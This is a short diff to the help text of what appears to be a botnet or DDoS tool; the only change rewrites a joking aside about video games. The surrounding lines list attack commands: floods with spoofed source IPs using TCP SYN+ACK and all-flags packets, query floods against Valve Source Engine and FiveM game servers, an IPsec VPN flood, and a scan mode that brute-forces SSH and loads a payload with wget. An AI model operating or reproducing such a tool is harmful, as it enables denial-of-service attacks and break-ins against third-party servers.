@@ -90,7 +90,7 @@ All of the attack vectors will be random source port automatically.
 		?sap     <srcIP> <dstIP> <port> <size>		Flood by using TCP SYN+ACK Flags to the target server.
 		?xmas    <srcIP> <dstIP> <port> <size>		Flood TCP packets by using all of TCP Flags to target server.
 		?vse 	 <srcIP> <dstIP>			Flood TSource Engine Query request to the target game server that used valve source engine.
-		?fms 	 <srcIP> <dstIP>			Flood query payload to a FiveM game server(They use to host GTAV i guess, i'm only playing Hell let loose and War thunder, lol).
+		?fms 	 <srcIP> <dstIP>			Flood query payload to a FiveM game server(They use to host GTAV i guess. i'm only playing "Hell let loose" for now, lol).
 		?ipsec 	 <srcIP> <dstIP>			Flood payload to to overwhelm system resources of VPN service and make IPSec VPN connections being affected.
 	
 	?scan 	 <modes> <ftp>				Scan SSH port on the network, Brute-Force attack to the target and load the payload by "wget".
